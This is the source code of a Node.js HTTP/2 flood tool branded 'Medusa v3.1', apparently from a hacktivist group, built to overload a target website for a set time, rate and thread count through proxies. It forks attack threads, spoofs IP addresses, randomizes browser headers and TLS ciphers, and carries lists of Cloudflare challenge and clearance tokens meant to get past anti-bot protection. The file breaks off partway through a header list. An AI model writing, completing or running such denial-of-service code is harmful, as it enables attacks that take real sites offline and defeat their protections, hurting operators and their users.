const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require('crypto');
const fs = require('fs');
const {
  HeaderGenerator
} = require('header-generator');
const axios = require("axios");
const https = require("https");
;
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x2fe61e) {});
if (process.argv.length < 0x7) {
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ 　 █▀▀▄ █▀▀▄ █▀▀█ █▀▀ ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m█─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ 　 █──█ █──█ █──█ ▀▀█   ");
  }
  if (process.argv.length < 0x7) {
    console.log("         [0m▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ 　 ▀▀▀─ ▀▀▀─ ▀▀▀▀ ▀▀▀       ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m     ╚═════╦════════════════════════════════════════════╦═════╝   ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║            [0mAuthor : [31mTrashDono              [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ║   [0mGithub : [32mhttps://github.com/TrashDono    [0;33m║  ");
  }
  if (process.argv.length < 0x7) {
    console.log(" [0;33m           ╚════════════════════════════════════════════╝");
  }
  if (process.argv.length < 0x7) {
    console.log("   ");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m node[1m[33m Medusa [1m[32m<HOST> <TIME> <RPS> <THREADS> <PROXY>.");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Made by [1m[31mhttps://t.me/RipperSec");
  }
  if (process.argv.length < 0x7) {
    console.log("[0m[34m[[1m[0m![0m[34m][1m[0m[1m[0m Update your proxy every 1 week :[1m[33m node scraper.js[1m[0m");
  }
  process.exit();
}
const headers = {};
function readLines(_0x1e1d9e) {
  return fs.readFileSync(_0x1e1d9e, "utf-8").toString().split(/\r?\n/);
}
const getCurrentTime = () => {
  const _0x485e4f = new Date();
  const _0x3bfd1e = _0x485e4f.getHours().toString().padStart(0x2, '0');
  const _0x2e3dd7 = _0x485e4f.getMinutes().toString().padStart(0x2, '0');
  const _0x1dab76 = _0x485e4f.getSeconds().toString().padStart(0x2, '0');
  return "[31m([32m" + _0x3bfd1e + ':' + _0x2e3dd7 + ':' + _0x1dab76 + "[31m)[0m";
};
const targetURL = process.argv[0x2];
const agent = new https.Agent({
  'rejectUnauthorized': false
});
function getStatus() {
  const _0xae62a0 = new Promise((_0x5b720d, _0x2d4da4) => {
    setTimeout(() => {
      _0x2d4da4(new Error("[31mRequest timed out"));
    }, 0x1388);
  });
  const _0x1e737b = axios.get(targetURL, {
    'httpsAgent': agent
  });
  Promise.race([_0x1e737b, _0xae62a0]).then(_0xe9d4c6 => {
    const {
      status: _0x18b827,
      data: _0x95bcd0
    } = _0xe9d4c6;
    console.log("[31m[[33mMedusa[31m][0m " + getCurrentTime() + " [32m> [0mTitle: " + getTitleFromHTML(_0x95bcd0) + " ([32m" + _0x18b827 + "[0m)");
  })["catch"](_0x218cc3 => {
    if (_0x218cc3.message === "[31mRequest timed out[0m") {
      console.log("[31m[[33mMedusa[31m][0m " + getCurrentTime() + " [32m> [31mRequest Timed Out[0m");
    } else {
      if (_0x218cc3.response) {
        const _0x37e1f8 = getTitleFromHTML(_0x218cc3.response.data);
        console.log("[31m[[33mMedusa[31m][0m " + getCurrentTime() + " ");
        console.log("[31m[[33mMedusa[31m][0m " + getCurrentTime() + " [32m> [0mTitle: " + _0x37e1f8 + " ([31m" + _0x218cc3.response.status + "[0m)");
      } else {
        console.log("[31m[[33mMedusa[31m][0m " + getCurrentTime() + " [32m> " + _0x218cc3.message + " [0m");
      }
    }
  });
}
function getTitleFromHTML(_0x2b591e) {
  const _0x3b8acc = _0x2b591e.match(/<title>(.*?)<\/title>/i);
  if (_0x3b8acc && _0x3b8acc[0x1]) {
    return _0x3b8acc[0x1];
  }
  return "Not Found";
}
function randomIntn(_0x1c4ac1, _0x5a8974) {
  return Math.floor(Math.random() * (_0x5a8974 - _0x1c4ac1) + _0x1c4ac1);
}
function randstr(_0x10a13d) {
  var _0xd7654d = '';
  var _0x2274ee = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (var _0x39f582 = 0x0; _0x39f582 < _0x10a13d; _0x39f582++) {
    _0xd7654d += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x2274ee));
  }
  ;
  return _0xd7654d;
}
function randayat(_0x592524) {
  var _0x1d622e = '';
  var _0x4ed612 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x298fde = 0x0; _0x298fde < _0x592524; _0x298fde++) {
    _0x1d622e += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x4ed612));
  }
  ;
  return _0x1d622e;
}
function randnombor(_0x4c172f) {
  var _0x519787 = '';
  var _0x1a96db = "0123456789".length;
  for (var _0x2e404d = 0x0; _0x2e404d < _0x4c172f; _0x2e404d++) {
    _0x519787 += "0123456789".charAt(Math.floor(Math.random() * _0x1a96db));
  }
  ;
  return _0x519787;
}
function randomElement(_0x38c83e) {
  return _0x38c83e[Math.floor(Math.random() * (_0x38c83e.length - 0x0) + 0x0)];
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
const spoofed = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
if (cluster.isMaster) {
  console.clear();
  console.log("\n\n[0m█▀▄▀█ █▀▀ █▀▀▄ █──█ █▀▀ █▀▀█ \n[0m█─▀─█ █▀▀ █──█ █──█ ▀▀█ █▄▄█ \n[0m▀───▀ ▀▀▀ ▀▀▀─ ─▀▀▀ ▀▀▀ ▀──▀ [31mv3.1[0m ");
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mTarget[33m : [32m" + process.argv[0x2]);
  console.log("[31m-> [0mTime[33m : [32m" + process.argv[0x3]);
  console.log("[31m-> [0mRate[33m : [32m" + process.argv[0x4]);
  console.log("[31m-> [0mThread[33m : [32m" + process.argv[0x5]);
  console.log("[31m-> [0mProxyFile[33m : [32m" + process.argv[0x6]);
  console.log("[33m--------------------------------------------");
  console.log("[31m-> [0mGithub[33m : [32mhttps://github.com/TrashDono");
  console.log("[33m--------------------------------------------");
  for (let i = 0x1; i <= process.argv[0x5]; i++) {
    cluster.fork();
    console.log("[31m[[33mMedusa[31m] [0m" + getCurrentTime() + " Attack Thread " + i + " Started");
  }
  console.log("[31m[[33mMedusa[31m] [0m" + getCurrentTime() + " [33mMedusa Attacking..");
  setInterval(getStatus, 0x7d0);
  setTimeout(() => {
    console.log("[31m[[33mMedusa[31m] [0m" + getCurrentTime() + " [33mThe Attack Is Over[0m");
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
}
let headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': 'firefox',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'opera',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }, {
    'name': "brave",
    'minVersion': 0x1,
    'httpVersion': '2'
  }, {
    'name': "duckduckgo",
    'minVersion': 0x5,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', 'linux', "macos", "android", 'ios'],
  'locales': ["en-US", 'en', "ko-KR", "zh-CN", "zh-TW", 'ja-JP', "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", 'en-SG', "en-HK"]
});
let randomHeaders = headerGenerator.getHeaders();
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", 'rsa_pss_rsae_sha384', "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", 'rsa_pkcs1_sha384', "rsa_pkcs1_sha512"];
const pathts = ["?s=", '/?', '', "?q=", '?true=', '?', '/', "/.lsrecap/recaptcha?", ".lsrecap/recaptcha?", "?page=1", '?page=2', "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", '?filter=popular', "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04", '?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514', "?__cf_chl_tk=ZpDDzirt54EoyEeNjwwGO_FZktYyR0QxXRz9Vt_egvk-1711220025-0.0.1.1-1471", '?__cf_chl_tk=2QI_clISOivyUmvBJ4fkVroBhLME3TJv3_2coOv7BXc-1711307038-0.0.1.1-1471', "?__cf_chl_tk=z6L8htd0t62MvL0xSbWgI67gGERMr2u7zjFDIlkGWYQ-1711310297-0.0.1.1-1471", '?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU', "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU", "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs", "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA", "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU", '?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs', '?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A', '?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA', '?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs', '?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA', '?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U', "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU", "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs", "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA", "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A", '?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs', "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA", '?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU', "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs", "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA", '?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0', "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh", "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0", "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0", "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0", "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU", "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU", "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA", "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU", "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU", "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs", "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA", '?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A', "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs", "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs"];
const cplist = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8'];
const lang_header = ['ko-KR', "en-US", "zh-CN", "zh-TW", "ja-JP", 'en-GB', "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", 'en-IN', "en-PH", 'en-SG', 'en-HK', 'en-GB,en;q=0.8', "en-GB,en;q=0.9", " en-GB,en;q=0.7", 'en-US,en;q=0.9', "en-GB,en;q=0.9", 'en-CA,en;q=0.9', "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", 'cy-GB,cy;q=0.9', 'da-DK,da;q=0.9', "de-DE,de;q=0.9", "el-GR,el;q=0.9", 'es-ES,es;q=0.9', "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", 'fi-FI,fi;q=0.9', "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", 'gu-IN,gu;q=0.9', "he-IL,he;q=0.9", 'hi-IN,hi;q=0.9', 'hr-HR,hr;q=0.9', "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", 'it-IT,it;q=0.9', "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", 'km-KH,km;q=0.9', 'kn-IN,kn;q=0.9', "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", 'lo-LA,lo;q=0.9', 'lt-LT,lt;q=0.9', "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", 'ml-IN,ml;q=0.9', "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", 'nb-NO,nb;q=0.9', "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", 'or-IN,or;q=0.9', 'pa-IN,pa;q=0.9', "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", 'te-IN,te;q=0.9', "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", 'dz-BT,dz;q=0.8', "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", 'fr-LU,fr;q=0.8', "gsw-CH,gsw;q=0.8", 'ha-Latn-NG,ha;q=0.8', 'hr-BA,hr;q=0.8', "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", 'km-KH,km;q=0.8', "kok-IN,kok;q=0.8", 'ks-Arab-IN,ks;q=0.8', "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", 'mr-MN,mr;q=0.8', 'ms-BN,ms;q=0.8', "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", 'quz-BO,quz;q=0.8', "quz-EC,quz;q=0.8", 'quz-PE,quz;q=0.8', 'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8', "se-NO,se;q=0.8", 'si-LK,si;q=0.8', "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", 'tn-ZA,tn;q=0.8', 'tt-RU,tt;q=0.8', "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", '*', '*', "*/*", 'gzip', "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
const control_header = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", 'max-stale', "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", 'private', "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", 'max-age=31557600', "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "X-Access-Control: Allow-Origin", "Cache-Control: no-cache, no-store, must-revalidate", "Authorization: Bearer your_token", "Content-Control: no-transform", "X-RateLimit-Limit: 1000", "Proxy-Connection: keep-alive", "X-Frame-Options: SAMEORIGIN", "Strict-Transport-Security: max-age=31536000; includeSubDomains", "X-Content-Type-Options: nosniff", "Retry-After: 120", "Connection: close", "Accept-Ranges: bytes", "ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "X-DNS-Prefetch-Control: off", "Expires: Thu, 01 Jan 1970 00:00:00 GMT", "X-Download-Options: noopen", "X-Permitted-Cross-Domain-Policies: none", "X-Frame-Options: DENY", "Expect-CT: max-age=86400, enforce", "Upgrade-Insecure-Requests: 1", "X-Forwarded-Proto: https", "Access-Control-Allow-Origin: *", "X-Content-Duration: 3600", "Alt-Svc: h3=\":443\"", "X-XSS-Protection: 1; mode=block", "Referrer-Policy: no-referrer", "X-Pingback: /xmlrpc.php", "Content-Encoding: gzip", "Age: 3600", "X-Clacks-Overhead: GNU Terry Pratchett", "Server: Apache/2.4.41 (Unix)", "X-Powered-By: PHP/7.4.3", "Allow: GET, POST, HEAD", "Retry-After: 3600", "Access-Control-Allow-Methods: GET, POST, OPTIONS", "X-UA-Compatible: IE=edge", "Public-Key-Pins: max-age=5184000; pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; includeSubDomains; report-uri=\"https://example.com/hpkp-report\"", "Content-Language: en-US", "X-Permitted-Cross-Domain-Policies: none", "Strict-Transport-Security: max-age=15768000; includeSubDomains", "Access-Control-Allow-Headers: Content-Type", "X-Frame-Options: ALLOW-FROM https://example.com/", "X-Robots-Tag: noindex, nofollow", 